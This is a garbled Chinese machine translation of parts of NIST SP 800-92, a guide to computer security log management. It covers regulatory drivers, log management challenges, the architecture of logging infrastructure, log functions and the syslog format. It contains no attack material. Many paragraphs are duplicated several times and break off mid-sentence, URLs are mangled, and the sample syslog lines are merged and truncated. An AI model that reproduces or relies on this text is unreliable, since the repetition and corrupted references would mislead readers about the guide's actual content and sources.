例如，NIST SP 800-66 的第 4.1 節描述了需要執行定期審查審計日誌和訪問報告。還，12 GLBA 要求金融機構保護其客戶的信息免受安全威脅。日誌管理有助於識別可能的安全違規並有效解決它們。� 1996 年健康保險流通與責任法案 (HIPAA)。HIPAA 包括某些健康信息的安全標準。NIST SP 800-66，實施健康保險流通與責任法案 (HIPAA) 安全規則的介紹性資源指南，列出了與 HIPAA 相關的日誌管理需求。 13 例如，NIST SP 800-66 的第 4.1 節描述了需要執行定期審查審計日誌和訪問報告。還，12 GLBA 要求金融機構保護其客戶的信息免受安全威脅。日誌管理有助於識別可能的安全違規並有效解決它們。� 1996 年健康保險流通與責任法案 (HIPAA)。HIPAA 包括某些健康信息的安全標準。NIST SP 800-66，實施健康保險流通與責任法案 (HIPAA) 安全規則的介紹性資源指南，列出了與 HIPAA 相關的日誌管理需求。 13 例如，NIST SP 800-66 的第 4.1 節描述了需要執行定期審查審計日誌和訪問報告。還，� 1996 年健康保險流通與責任法案 (HIPAA)。HIPAA 包括某些健康信息的安全標準。NIST SP 800-66，實施健康保險流通與責任法案 (HIPAA) 安全規則的介紹性資源指南，列出了與 HIPAA 相關的日誌管理需求。 13 例如，NIST SP 800-66 的第 4.1 節描述了需要執行定期審查審計日誌和訪問報告。還，� 1996 年健康保險流通與責任法案 (HIPAA)。HIPAA 包括某些健康信息的安全標準。NIST SP 800-66，實施健康保險流通與責任法案 (HIPAA) 安全規則的介紹性資源指南，列出了與 HIPAA 相關的日誌管理需求。 13 例如，NIST SP 800-66 的第 4.1 節描述了需要執行定期審查審計日誌和訪問報告。還，NIST SP 800-66 的第 1 部分描述了定期審查審計日誌和訪問報告的必要性。還，NIST SP 800-66 的第 1 部分描述了定期審查審計日誌和訪問報告的必要性。還，

11 FISMA 和 NIST SP 800-53 的副本可在http://csrc nist.gov/sec-cert/ca-library html獲得。12 有關 GLBA 的更多信息，請訪問http://www.ftc.gov/privacy/privacyinitiatives/glbact html。可以從http://www ftc.gov/privacy/privacyinitiatives/financial rule lr html下載 GLBA 的副本。13 HIPAA 可從http://www hhs.gov/ocr/hipaa/ 下載。NIST SP 800-66 位於 http://csrcnist.gov/publications/nistpubs/。2-7 計算機安全日誌管理指南 第4.22 節規定行動和活動的文件需要至少保留六年。� 2002.14 的薩班斯-奧克斯利法案 (SOX) 雖然 SOX 主要適用於財務和會計實踐，但它也包含支持這些實踐的信息技術 (IT) 功能。SOX 可以通過定期審查日誌來支持安全違規的跡象，包括利用，以及保留日誌和日誌審查記錄以供審計員將來審查。� 支付卡行業數據安全標準 (PCI DSS)。PCI DSS 適用於為信用卡“存儲、處理或傳輸持卡人數據”的組織。PCI DSS 的其中一項要求是“跟踪……所有對網絡資源和持卡人數據的訪問”。15 2. 3 日誌管理中的挑戰 大多數組織都面臨著與日誌管理相關的類似挑戰，這些挑戰具有相同的根本問題：有效地平衡有限數量的日誌管理資源與不斷增加的日誌數據供應。本節討論最常見的挑戰類型，分為三組。首先，由於日誌的多樣性和普遍性，初始生成的日誌存在幾個潛在問題。其次，生成的日誌的機密性、完整性和可用性可能會被無意或有意地破壞。最後，負責執行日誌分析的人員通常沒有充分準備和支持。2.3.1 到 2.3.3 節分別討論了這三類日誌挑戰。2.3.1 日誌生成和存儲在一個典型的組織中，許多主機的操作系統，安全軟件和其他應用程序生成和存儲日誌。這使日誌管理在以下方面變得複雜： 許多日誌源。日誌位於整個組織的許多主機上，因此需要在整個組織中執行日誌管理。此外，單個日誌源可以生成多個日誌——例如，應用程序在一個日誌中存儲身份驗證嘗試，在另一個日誌中存儲網絡活動。不一致的日誌內容。每個日誌源在其日誌條目中記錄某些信息，例如主機 IP 地址和用戶名。為了提高效率，日誌源通常只記錄他們認為最重要的信息。這會使鏈接不同日誌源記錄的事件變得困難，因為它們可能沒有記錄任何共同的值（例如，source 1記錄源IP地址不記錄用戶名，source 2記錄用戶名不記錄源IP地址）。每種類型的日誌源也可能代表不同的值；這些差異可能很小，例如一個日期是 MMDDYYYY 格式，另一個是 MM-DD-YYYY 格式，或者它們可能更複雜，例如文件傳輸協議 (FTP) 的使用在一個文件中由名稱標識日誌 (“FTP”) 和另一個日誌 (21) 中的端口號。這進一步使鏈接不同日誌源記錄的事件的過程複雜化。16 14 有關 SOX 的更多信息以及 SOX 本身的副本，請訪問 例如一個日期為 MMDDYYYY 格式，另一個日期為 MM-DD-YYYY 格式，或者它們可能更複雜，例如文件傳輸協議 (FTP) 的使用在一個日誌（“FTP”）中按名稱標識並通過另一個日誌中的端口號 (21)。這進一步使鏈接不同日誌源記錄的事件的過程複雜化。16 14 有關 SOX 的更多信息以及 SOX 本身的副本，請訪問 例如一個日期為 MMDDYYYY 格式，另一個日期為 MM-DD-YYYY 格式，或者它們可能更複雜，例如文件傳輸協議 (FTP) 的使用在一個日誌（“FTP”）中按名稱標識並通過另一個日誌中的端口號 (21)。這進一步使鏈接不同日誌源記錄的事件的過程複雜化。16 14 有關 SOX 的更多信息以及 SOX 本身的副本，請訪問http://www.sec.gov/about/laws.shtml。15 此信息來自 PCI DSS，可在 http://usa.visa.com/download/business/accepting visa/ops risk management/cisp PCI Data Security Standard.pdf 獲取。16 日誌內容有一些標準，例如 Web 服務器日誌。但是，對於大多數日誌源，沒有可用的日誌記錄標準。當前的一項標準工作是入侵檢測消息交換格式 (IDMEF)；IDMEF 的最新互聯網草案可在http://www.ietf.org/internet-drafts/draft-ietf-idwg-idmef-xml-16.txt獲得. 2-8 計算機安全日誌管理指南 不一致的時間戳。每個生成日誌的主機在為每個日誌條目設置時間戳時通常會參考其內部時鐘。如果主機的時鐘不准確，則其日誌中的時間戳也不准確。這會使日誌分析變得更加困難，尤其是在分析來自多個主機的日誌時。例如，時間戳可能表示事件 A 在事件 B 之前 45 秒發生，而事件 A 實際上在事件 B 之後兩分鐘發生。 不一致的日誌格式。17 許多日誌源類型使用不同的日誌格式，例如逗號 -分隔或製表符分隔的文本文件、18 數據庫、系統日誌、簡單網絡管理協議 (SNMP)、可擴展標記語言 (XML) 和二進製文件。19 一些日誌專為人類閱讀而設計，而其他人則不是；一些日誌使用標準格式，而其他日誌使用專有格式。有些日誌的創建不是為了本地存儲在文件中，而是為了傳輸到另一個系統進行處理；一個常見的例子是 SNMP 陷阱。對於某些輸出格式，尤其是文本文件，每個日誌條目中值的順序和值之間的分隔符（例如，逗號分隔值、製表符分隔值、XML）有多種可能性。為了便於分析日誌，組織通常需要實施自動化方法，將具有不同內容和格式的日誌轉換為具有一致數據字段表示的單一標準格式。不一致的日誌格式和數據字段表示也給審查日誌的人帶來了挑戰，誰需要了解每個日誌中各個數據字段的含義以執行徹底審查。由於組織內的大多數主機通常會記錄一些與計算機安全相關的信息，通常每個主機都有多個日誌，因此組織內的日誌數量可能非常多。許多日誌每天記錄大量數據，因此組織內每天的日誌數據總量往往是巨大的。這會影響將數據存儲適當時間長度所需的資源，如第 2.3.2 節所述，以及執行數據審查（如第 2.3.3 節所述）。日誌的分佈式特性、日誌格式的不一致以及日誌的海量都給日誌生成和存儲的管理帶來了挑戰。2.3.2 由於組織內的大多數主機通常會記錄一些與計算機安全相關的信息，通常每個主機都有多個日誌，因此組織內的日誌數量可能非常多。許多日誌每天記錄大量數據，因此組織內每天的日誌數據總量往往是巨大的。這會影響將數據存儲適當時間長度所需的資源，如第 2.3.2 節所述，以及執行數據審查（如第 2.3.3 節所述）。日誌的分佈式特性、日誌格式的不一致以及日誌的海量都給日誌生成和存儲的管理帶來了挑戰。2.3.2 由於組織內的大多數主機通常會記錄一些與計算機安全相關的信息，通常每個主機都有多個日誌，因此組織內的日誌數量可能非常多。許多日誌每天記錄大量數據，因此組織內每天的日誌數據總量往往是巨大的。這會影響將數據存儲適當時間長度所需的資源，如第 2.3.2 節所述，以及執行數據審查（如第 2.3.3 節所述）。日誌的分佈式特性、日誌格式的不一致以及日誌的海量都給日誌生成和存儲的管理帶來了挑戰。2.3.2 許多日誌每天記錄大量數據，因此組織內每天的日誌數據總量往往是巨大的。這會影響將數據存儲適當時間長度所需的資源，如第 2.3.2 節所述，以及執行數據審查（如第 2.3.3 節所述）。日誌的分佈式特性、日誌格式的不一致以及日誌的海量都給日誌生成和存儲的管理帶來了挑戰。2.3.2 許多日誌每天記錄大量數據，因此組織內每天的日誌數據總量往往是巨大的。這會影響將數據存儲適當時間長度所需的資源，如第 2.3.2 節所述，以及執行數據審查（如第 2.3.3 節所述）。日誌的分佈式特性、日誌格式的不一致以及日誌的海量都給日誌生成和存儲的管理帶來了挑戰。2.3.2 和日誌的海量都給日誌生成和存儲的管理帶來了挑戰。2.3.2 和日誌的海量都給日誌生成和存儲的管理帶來了挑戰。2.3.2

日誌保護 由於日誌包含系統和網絡安全的記錄，因此需要保護它們免受機密性和完整性的破壞。例如，日誌可能有意或無意地捕獲用戶密碼和電子郵件內容等敏感信息。這會引發安全和隱私問題，涉及查看日誌的個人和可能能夠通過授權或未授權方式訪問日誌的其他人。在存儲或運輸過程中保護不當的日誌也可能容易受到有意和無意的更改和破壞。這可能會造成多種影響，包括讓惡意活動不被注意和操縱證據以隱藏惡意方的身份。例如，許多 rootkit 專門設計用於更改日誌以刪除 rootkit 安裝或執行的任何證據。組織還需要保護其日誌的可用性。許多日誌都有最大大小，例如存儲 10,000 個最近的事件，或保留 100 兆字節的日誌數據。當達到大小限制時，日誌可能會用新數據覆蓋舊數據或完全停止記錄，這兩種情況都會 17 對於用於描述日誌條目組成的標準術語，安全社區沒有達成共識文件。出於本出版物的目的，術語“日誌內容”和“日誌格式”已被定義和使用，但其他出版物可能對這些術語使用不同的術語或不同的定義。18 假定文本文件日誌僅包含文本並不總是安全的。例如，作為攻擊的一部分，攻擊者可能會向需要文本數據的程序提供二進制數據作為輸入。如果程序將此輸入記錄到它的日誌中，那麼日誌就不再是嚴格意義上的文本文件。這可能會導致日誌管理實用程序失敗或錯誤處理日誌數據。19 二進製文件通常使用特定於軟件的專有格式（例如，Windows 系統上的事件日誌）。2-9 計算機安全日誌管理指南 導致日誌數據可用性喪失。為了滿足數據保留要求，組織可能需要保留日誌文件副本的時間比原始日誌源可以支持的時間更長，這就需要建立日誌歸檔過程。由於日誌量大，在某些情況下，通過過濾掉不需要歸檔的日誌條目來減少日誌可能是合適的。存檔日誌的機密性和完整性也需要得到保護。2.3.3 日誌分析 在大多數組織中，網絡和系統管理員傳統上負責執行日誌分析——研究日誌條目以識別感興趣的事件。它通常被管理員和管理層視為低優先級任務，因為管理員的其他職責（例如處理操作問題和解決安全漏洞）需要快速響應。負責執行日誌分析的管理員通常沒有接受過如何有效地進行分析的培訓，尤其是在優先級排序方面。還，管理員通常得不到能夠有效自動化大部分分析過程的工具，例如腳本和安全軟件工具（例如，基於主機的入侵檢測產品、安全信息和事件管理軟件）。其中許多工具特別有助於查找人類無法輕易看到的模式，例如關聯來自與同一事件相關的多個日誌的條目。另一個問題是，許多管理員認為日誌分析很無聊，並且對所需的時間量沒有什麼好處。日誌分析通常被視為反應性的——在通過其他方式發現問題後要做的事情——而不是主動性的，以識別正在進行的活動並尋找即將發生的問題的跡象。傳統上，大多數日誌尚未以實時或接近實時的方式進行分析。如果沒有完善的日誌分析流程，日誌的價值就會大大降低。2.4 迎接挑戰 儘管組織在日誌管理方面面臨許多挑戰，但組織可以遵循一些關鍵實踐來避免甚至解決它面臨的許多障礙。以下四項措施對這些解決方案進行了簡要說明： � 在整個組織中適當地優先考慮日誌管理。組織應定義其執行日誌記錄和監控日誌的要求和目標，以包括適用的法律、法規和現有的組織政策。然後，組織可以根據平衡組織的風險降低與執行日誌管理功能所需的時間和資源來確定其目標的優先級。� 建立日誌管理的政策和程序。政策和程序是有益的，因為它們確保整個組織採用一致的方法，並確保滿足法律和法規要求。定期審核是確認整個組織都遵循日誌記錄標準和指南的一種方法。測試和驗證可以進一步確保日誌管理過程中的策略和程序得到正確執行。� 創建和維護安全的日誌管理基礎設施。創建日誌管理基礎架構的組件並確定這些組件如何交互對組織非常有幫助。這有助於保護日誌數據的完整性，防止意外或有意的修改或刪除，也有助於維護日誌數據的機密性。創建一個足夠強大的基礎設施也很重要，它不僅可以處理預期的日誌數據量，還可以處理極端情況下的峰值量（例如，廣泛的惡意軟件事件、滲透測試、漏洞掃描）。2-10 計算機安全日誌管理指南 為所有負有日誌管理責任的員工提供充分的支持。在定義日誌管理方案時，組織應確保向相關員工提供有關其日誌管理職責的必要培訓，以及支持日誌管理所需資源的技能指導。支持還包括提供日誌管理工具和工具文檔，提供日誌管理活動的技術指導，以及向日誌管理人員傳播信息。2.5 總結 組織內的許多日誌包含與系統和網絡內發生的計算機安全事件相關的記錄。例如，大多數組織使用多種類型的安全軟件（例如防病毒軟件、防火牆和入侵防禦系統）來檢測惡意活動並保護系統和數據免受損壞。安全軟件通常是計算機安全日誌的主要來源。服務器操作系統，工作站和網絡設備通常會記錄各種與安全相關的信息，例如係統事件和審計記錄。另一種常見類型的日誌生成器是應用程序，它可以將信息發送到操作系統日誌或特定於應用程序的日誌。計算機安全日誌的數量、體積和種類都大大增加，這就產生了對計算機安全日誌管理的需求——計算機安全日誌數據的產生、傳輸、存儲、分析和處置的過程。日誌管理有助於確保在適當的時間段內足夠詳細地存儲計算機安全記錄。例行日誌分析有利於識別安全事件、策略違規、欺詐活動和操作問題。日誌對於建立基線也很有用，執行審計和取證分析，支持內部調查，並確定運營趨勢和長期問題。組織還可以存儲和分析某些日誌以符合 FISMA、HIPAA、GLBA、SOX 和其他主要法規、指南和標準。日誌管理的根本問題是平衡有限數量的日誌管理資源與持續供應的日誌數據。日誌生成和存儲複雜，主要是日誌源多，源間日誌格式不一致，日常日誌數據量大。日誌管理還涉及保護日誌免受其機密性和完整性的破壞，以及支持它們的可用性。日誌管理的另一個問題是讓網絡和系統管理員定期、高效、日誌數據的有效分析。為應對日誌管理中的主要挑戰而推薦的關鍵實踐如下： 在整個組織中適當地優先考慮日誌管理 為日誌管理制定政策和程序 創建和維護安全的日誌管理基礎設施 為所有員工提供適當的日誌管理培訓職責。2-11 計算機安全日誌管理指南 此頁有意留空。2-12 計算機安全日誌管理指南 3. 日誌管理基礎設施 日誌管理基礎設施包括用於生成、傳輸、存儲、分析和處理日誌數據的硬件、軟件、網絡和媒體。20 大多數組織都有一個或更多日誌管理基礎設施。21 本節介紹日誌管理基礎架構的典型架構及其組件如何相互交互。然後描述了在日誌管理基礎結構中執行的基本功能。接下來，它考察了兩大類日誌管理軟件：基於 syslog 的集中式日誌記錄軟件和安全信息與事件管理軟件。本節還描述了在日誌管理基礎結構中可能有用的其他類型的軟件。3.1 架構 日誌管理基礎架構通常包括以下三層： 日誌生成。第一層包含生成日誌數據的主機。一些主機運行日誌記錄客戶端應用程序或服務，使它們的日誌數據可通過網絡訪問第二層的日誌服務器。其他主機通過其他方式提供其日誌，例如允許服務器對它們進行身份驗證並檢索日誌文件的副本。� 日誌分析和存儲。第二層由一個或多個日誌服務器組成，這些日誌服務器從第一層的主機接收日誌數據或日誌數據的副本。數據以實時或接近實時的方式傳輸到服務器，或者根據時間表或等待傳輸的日誌數據量偶爾分批傳輸。從多個日誌生成器接收日誌數據的服務器有時稱為收集器或聚合器。日誌數據可以存儲在日誌服務器本身或單獨的數據庫服務器上。� 日誌監控。第三層包含可用於監控和審查日誌數據以及自動分析結果的控制台。日誌監控控制台也可用於生成報告。在一些日誌管理基礎設施中，控制台也可以用來為日誌服務器和客戶端提供管理。此外，控制台用戶權限有時可能僅限於每個用戶的必要功能和數據源。第二層——日誌分析和存儲——在復雜性和結構上可能有很大差異。最簡單的安排是處理所有日誌分析和存儲功能的單個日誌服務器。更複雜的第二層安排示例如下： � 多台日誌服務器，每台服務器執行專門的功能，例如一台服務器執行日誌收集、分析和短期日誌存儲，另一台服務器執行長期存儲。� 多個日誌服務器，每個服務器為某些日誌生成器執行分析和/或存儲。這也可以提供一些冗餘。如果主日誌服務器不可用，日誌生成器可以切換到備用日誌服務器。此外，日誌服務器可以配置為彼此共享日誌數據，這也支持冗餘。

20 儘管本文檔僅在計算機安全日誌數據的上下文中描述了日誌管理基礎架構，但組織可以將相同的基礎架構用於其他類型的日誌數據。本節介紹的一般原則和技術適用於其他日誌記錄需求。21 一些組織，尤其是規模較小的組織，可能會選擇在整個企業中使用單一的日誌管理基礎設施。對於大多數組織而言，單一基礎設施不可行的原因有多種，包括對單一基礎設施可擴展性的限制、在邏輯上或物理上獨立的網絡上進行日誌記錄、對穩健性的擔憂（例如，擁有單一基礎設施意味著故障該基礎架構會影響整個組織的日誌記錄），日誌生成器和基礎設施組件之間的互操作性問題。3-1 計算機安全日誌管理指南 兩級日誌服務器，第一級分佈式日誌服務器從日誌生成器接收日誌，並將它們接收到的部分或全部日誌數據轉發到第二級更集中的日誌服務器. （額外的層可以添加到這個架構，以使其更加靈活、可擴展和冗餘。）在某些情況下，第一級服務器充當日誌緩存服務器——簡單地從日誌生成器接收日誌並將它們轉發到其他日誌服務器。這樣做可以保護二級日誌服務器免受直接攻擊，並且在日誌生成器和二級日誌服務器之間存在網絡可靠性問題時也很有用，例如那些只能通過 Internet 訪問的服務器。在這種情況下，在可靠的本地網絡上擁有日誌緩存服務器允許日誌生成器將他們的日誌傳輸到這些服務器，然後在網絡連接允許時將日誌傳輸到二級日誌服務器。日誌管理基礎結構組件之間的通信通常發生在組織的常規網絡上，因為生成日誌數據的主機可能位於整個組織的網絡中。然而，可以使用物理上或邏輯上獨立的日誌記錄網絡，特別是用於從關鍵設備（例如，經常傳輸大量日誌數據的防火牆和網絡入侵檢測系統）獲取日誌以及用於在日誌服務器之間傳輸日誌數據。在廣泛的惡意軟件事件或其他基於網絡的攻擊期間，常規網絡可能不穩定或不可用。使用單獨的日誌記錄網絡的另一個動機是保護組織常規網絡上的日誌數據免遭竊聽。如果不使用單獨的日誌記錄網絡，則可以使用數據加密等額外的安全控制來保護常規網絡上的日誌記錄通信。擁有單獨的日誌記錄網絡的另一個好處是保護那些僅用於日誌管理的組件免受攻擊。對於日誌管理基礎架構，可能有一些無法自動參與基礎架構的日誌生成主機，例如未聯網的計算機，以及無法配置為將其日誌傳輸到日誌服務器。如果他們的日誌數據需要合併到日誌管理基礎設施中，組織可以採用帶外解決方案，例如手動將日誌從主機傳輸到一次寫入介質（例如 CD-ROM），然後從22 日誌管理基礎設施還需要適應具有間歇性或低帶寬連接的主機，例如移動主機和通過撥號調製解調器連接的主機。這些主機在如何參與日誌管理基礎設施方面可能受到嚴格限制，但這不會改變它們包含的日誌的重要性。一個組織可能對整個企業只有一個日誌管理基礎設施，但更常見的是擁有多個不一定互操作的獨立基礎設施。擁有一個單一的日誌管理基礎設施可以提供一個單一的點來審查組織的所有相關日誌數據，但是對於更大的組織來說，這種基礎設施的規模以及它必須處理和存儲的數據量通常使它不可行。較大的組織通常有多個日誌管理基礎設施，有時有幾十個或數百個。每個基礎設施的範圍可以由許多因素決定，包括組織的內部結構、系統類型（例如，用於企業安全系統的單獨基礎設施）、日誌類型（例如，用於應用程序審計日誌的單獨基礎設施）和設施位置。但對於大型組織而言，這種基礎設施的規模以及它必須處理和存儲的數據量通常使其不可行。較大的組織通常有多個日誌管理基礎設施，有時有幾十個或數百個。每個基礎設施的範圍可以由許多因素決定，包括組織的內部結構、系統類型（例如，用於企業安全系統的單獨基礎設施）、日誌類型（例如，用於應用程序審計日誌的單獨基礎設施）和設施位置。但對於大型組織而言，這種基礎設施的規模以及它必須處理和存儲的數據量通常使其不可行。較大的組織通常有多個日誌管理基礎設施，有時有幾十個或數百個。每個基礎設施的範圍可以由許多因素決定，包括組織的內部結構、系統類型（例如，用於企業安全系統的單獨基礎設施）、日誌類型（例如，用於應用程序審計日誌的單獨基礎設施）和設施位置。

22 如果數據不需要傳輸到日誌管理基礎設施，那麼本地管理員可以在日誌源本身進行管理和分析。3-2 計算機安全日誌管理指南 3.2 功能 日誌管理基礎設施通常執行多種功能，以幫助存儲、分析和處理日誌數據。這些功能通常以不改變原始日誌的方式執行。 23 以下項目描述了常見的日誌管理基礎設施功能： � 一般 – 日誌解析是從日誌中提取數據，以便解析的值可以用作輸入對於另一個日誌記錄過程。一個簡單的解析示例是讀取一個基於文本的日誌文件，該文件每行包含 10 個逗號分隔值，並從每行中提取這 10 個值。解析是作為許多其他日誌記錄功能的一部分執行的，例如日誌轉換和日誌查看。– 事件過濾是從分析、報告或長期存儲中抑制日誌條目，因為它們的特徵表明它們不太可能包含感興趣的信息。例如，重複條目和標准信息條目可能會被過濾掉，因為它們不會為日誌分析人員提供有用的信息。通常，過濾不會影響事件的生成或短期存儲，因為它不會更改原始日誌文件。– 在事件聚合中，類似的條目被合併為一個條目，其中包含事件發生次數的計數。例如，每個記錄掃描部分的一千個條目可以聚合成一個條目，指示掃描了多少主機。聚合通常在日誌最初生成時執行（生成器計算類似的相關事件並定期寫入包含計數的日誌條目），它也可以作為日誌縮減或事件關聯過程的一部分執行，如下所述。� 存儲 – 日誌輪換是關閉一個日誌文件，並在第一個文件被認為完成時打開一個新的日誌文件。日誌輪換通常根據時間表（例如，每小時、每天、每週）或當日誌文件達到特定大小時執行。日誌輪換的主要好處是保留日誌條目並使日誌文件的大小保持可管理。旋轉日誌文件時，保存的日誌文件可以壓縮以節省空間。此外，在日誌輪換期間，通常會運行對存檔日誌起作用的腳本。例如，腳本可能會分析舊日誌以識別惡意活動，或者可能會執行過濾以僅保留滿足某些特徵的日誌條目。許多日誌生成器提供日誌輪換功能；許多日誌文件也可以通過簡單的腳本或第三方實用程序進行輪換，在某些情況下，它們提供日誌生成器不提供的功能。– 日誌歸檔將日誌保留較長時間，通常保留在可移動媒體、存儲區域網絡 (SAN) 或專門的日誌歸檔設備或服務器上。通常需要保留日誌以滿足法律或法規要求。第 4.2 節提供了有關日誌歸檔的更多信息。日誌歸檔有兩種類型：保留和保存。日誌保留是作為標準操作活動的一部分定期歸檔日誌。日誌保存保留通常會被丟棄的日誌，因為它們包含特別感興趣的活動記錄。日誌保存通常用於支持事件處理或調查。

23 確保原始日誌未被更改支持將其用於證據目的。3-3 計算機安全日誌管理指南 – 日誌壓縮是以一種減少文件所需存儲空間量而不改變其內容含義的方式存儲日誌文件。日誌壓縮通常在日誌輪轉或歸檔時執行。– 日誌縮減是從日誌中刪除不需要的條目以創建更小的新日誌。一個類似的過程是事件減少，它從所有日誌條目中刪除不需要的數據字段。日誌和事件縮減通常與日誌歸檔一起執行，以便只有感興趣的日誌條目和數據字段被放入長期存儲中。– 日誌轉換是以一種格式解析日誌並以第二種格式存儲其條目。例如，轉換可以從存儲在數據庫中的日誌中獲取數據，並將其以 XML 格式保存在文本文件中。許多日誌生成器可以將自己的日誌轉換為另一種格式；第三方轉換實用程序也可用。日誌轉換有時包括過濾、聚合和規範化等操作。– 在日誌規範化中，每個日誌數據字段都被轉換為特定的數據表示形式並進行一致的分類。規範化最常見的用途之一是以單一格式存儲日期和時間。例如，一個日誌生成器可能以十二小時格式 (2:34:56 PM EDT) 存儲事件時間，歸類為時間戳，而另一個日誌生成器可能以二十四 (14:34) 格式存儲事件，歸類為事件時間，時區以不同的表示法 (-0400) 存儲在分類為時區的不同字段中。24 當使用多種日誌格式時，規範化數據可以更輕鬆地進行分析和報告。然而，規範化可能非常耗費資源，尤其是對於復雜的日誌條目（例如，典型的入侵檢測日誌）。– 日誌文件完整性檢查涉及計算每個文件的消息摘要並安全地存儲消息摘要以確保檢測到存檔日誌的更改。消息摘要是唯一標識數據的數字簽名，具有改變數據中的單個位會導致生成完全不同的消息摘要的屬性。最常用的消息摘要算法是 MD5 和 Secure Hash Algorithm Algorithm 1 (SHA1)。25 如果日誌文件被修改並重新計算其消息摘要，它將與原始消息摘要不匹配，表明文件已被更改。原始消息摘要應通過 FIPS 批准的加密算法、存儲在只讀介質上或其他合適的方式來防止更改。� 分析——事件相關性是尋找兩個或多個日誌條目之間的關係。最常見的事件關聯形式是基於規則的關聯，它匹配多個日誌

24 正常化時間通常特別具有挑戰性。在多個時區擁有系統的組織通常需要將所有記錄的時間轉換為一個時區。此外，系統的時鐘可能彼此不同步，因此可能需要從不同步源記錄的日誌條目中添加或減去時間。組織應盡可能使用網絡時間協議 (NTP) 服務器等時間同步技術，以保持日誌源的時鐘彼此一致。25 聯邦機構必須使用經驗證的加密模塊中包含的聯邦信息處理標準 (FIPS) 批准的加密算法。因為 SHA 是 FIPS 認可的算法而 MD5 不是，所以聯邦機構必須使用 SHA 而不是 MD5 來進行消息摘要。NIST 的密碼模塊驗證程序 (CMVP) 協調 FIPS 測試；CMVP 網站位於http://csrc.nist.gov/cryptval/。FIPS 180-2，安全散列標準，可從http://csrc nist.gov/publications/fips/fips180-2/fips180-2withchangenotice.pdf 獲得。SHA-1 一直是最常用的 SHA 版本；但是，NIST 已宣布聯邦機構應計劃到 2010 年從 SHA-1 過渡到更強大的 SHA 形式（例如 SHA-224、SHA-256）。有關更多信息，請參閱 NIST 2004 年 8 月發表在http://上的評論 /csrc nist.gov/hash standards comments.pdf，以及http://wwwnsrl nist.gov/collision.html。如果生成消息摘要的操作系統或應用程序支持 SHA-256，組織應考慮使用 SHA-256 而不是 SHA-224 或 SHA-1。3-4 計算機安全日誌管理指南 基於記錄的值（例如時間戳、IP 地址和事件類型）來自單個源或多個源的條目。事件關聯也可以通過其他方式進行，例如使用統計方法或可視化工具。如果關聯是通過自動化方法執行的，那麼成功關聯的結果通常是一個新的日誌條目，它將信息片段匯集到一個地方。根據該信息的性質，基礎設施還可能生成警報以指示已識別的事件需要進一步調查。– 日誌查看以人類可讀的格式顯示日誌條目。大多數日誌生成器都提供某種日誌查看功能；第三方日誌查看實用程序也可用。一些日誌查看器提供過濾和聚合功能。– 日誌報告顯示日誌分析的結果。通常執行日誌報告以總結特定時間段內的重要活動或記錄與特定事件或事件系列相關的詳細信息。� 處置 – 日誌清除是從日誌中刪除特定日期和時間之前的所有條目。通常執行日誌清除以刪除系統不再需要的舊日誌數據，因為它不重要或已存檔。日誌管理基礎設施通常包含本節中描述的大部分或全部功能。3.1 節描述了日誌管理基礎設施的組件和架構。一些日誌功能在日誌管理基礎結構的三層中的位置主要取決於所使用的日誌管理軟件的類型。日誌管理基礎架構通常基於兩大類日誌管理軟件之一：基於系統日誌的集中式日誌記錄軟件以及安全信息和事件管理軟件。3.3 和 3.4 節描述了這些類型的軟件。第 3.5 節描述了在日誌管理基礎架構中可能有價值的其他類型的軟件。3.3 基於 Syslog 的集中日誌記錄軟件 在基於 syslog 協議的日誌記錄基礎設施中，每個日誌生成器對其日誌使用相同的高級格式，並使用相同的基本機制將其日誌條目傳輸到運行在另一台主機上的系統日誌服務器。 26 Syslog 為日誌條目的生成、存儲和傳輸提供了一個簡單的框架，任何操作系統、安全軟件或應用程序在設計時可以使用。許多日誌源要么使用 syslog 作為其本機日誌記錄格式，要么提供允許將其日誌格式轉換為 syslog 格式的功能。第 3.3.1 節描述了系統日誌消息的格式，第 3.3.2 節討論了常見系統日誌實現的安全功能。27 3.3.1 許多日誌源要么使用 syslog 作為其本機日誌記錄格式，要么提供允許將其日誌格式轉換為 syslog 格式的功能。第 3.3.1 節描述了系統日誌消息的格式，第 3.3.2 節討論了常見系統日誌實現的安全功能。27 3.3.1 許多日誌源要么使用 syslog 作為其本機日誌記錄格式，要么提供允許將其日誌格式轉換為 syslog 格式的功能。第 3.3.1 節描述了系統日誌消息的格式，第 3.3.2 節討論了常見系統日誌實現的安全功能。27 3.3.1

Syslog 格式 Syslog 根據以下兩個屬性的重要性為每條消息分配優先級： 消息類型，稱為設施。設施的示例包括內核消息、郵件系統消息、授權消息、打印機消息和審計消息。26 儘管 syslog 已用於日誌生成和存儲多年，但尚未正式標準化。Request for Comments (RFC) 3164，The BSD Syslog Protocol，可在http://www.ietf.org/rfc/rfc3164.txt獲得, 是一個信息文件，而不是一個真正的標準。由於缺乏 syslog 標準，現有的 syslog 實現之間存在重大差異。27 大多數係統日誌實施都是免費的；還有一些商業系統日誌實現。3-5 計算機安全日誌管理指南 � 嚴重性。每條日誌消息都分配了一個嚴重性值，從 0（緊急）到 7（調試）。28 Syslog 使用消息優先級來確定應該更快地處理哪些消息，例如轉發優先級高的消息比轉發優先級低的消息更快。但是，優先級不會影響對每條消息執行的操作。Syslog 可以配置為根據每條消息的設施和嚴重性以不同方式處理日誌條目。例如，它可以將嚴重性為 0 的內核消息轉發到中央服務器以供進一步審查，並簡單地記錄所有嚴重性為 7 的消息而不轉發它們。然而，syslog 並沒有提供比消息處理更多的粒度；它不能根據消息的來源或內容做出決定。Syslog 旨在非常簡單，每條 syslog 消息只有三個部分。第一部分將設施和嚴重性指定為數值。消息的第二部分包含時間戳和日誌源的主機名或 IP 地址。第三部分是實際的日誌消息內容。消息內容中沒有定義標準字段；它旨在是人類可讀的，而不是易於機器解析的。這為日誌生成器提供了非常高的靈活性，它可以將他們認為重要的任何信息放在內容字段中，但這使得日誌數據的自動化分析變得非常具有挑戰性。單個源可能對其日誌消息內容使用多種不同的格式，因此分析程序需要熟悉每種格式並能夠提取每種格式字段中數據的含義。當許多來源生成日誌消息時，這個問題變得更具挑戰性。了解所有日誌消息的含義可能不可行，因此分析可能僅限於關鍵字和模式搜索。一些組織設計他們的系統日誌基礎設施，以便將相似類型的消息組合在一起或分配相似的代碼，這可以使日誌分析自動化更容易執行。圖 3-1 顯示了幾個系統日誌消息示例。3 月 1 日 06:25：43 SERVER1 SSHD [23170]：172.30.128.115端口21011 SSH2 SSH2 MAR 1 07:16:42 SERVER1 SSHD [9326] sshd[22938]：反向映射檢查 ip10.165.nist.gov 的 getaddrinfo 失敗 - 可能是破解嘗試！3 月 1 日 07:26:28 server1 sshd[22572]：從 172.30.128.115 端口 30606 ssh2 接受 server2 的公鑰 3 月 1 日 07:28:33 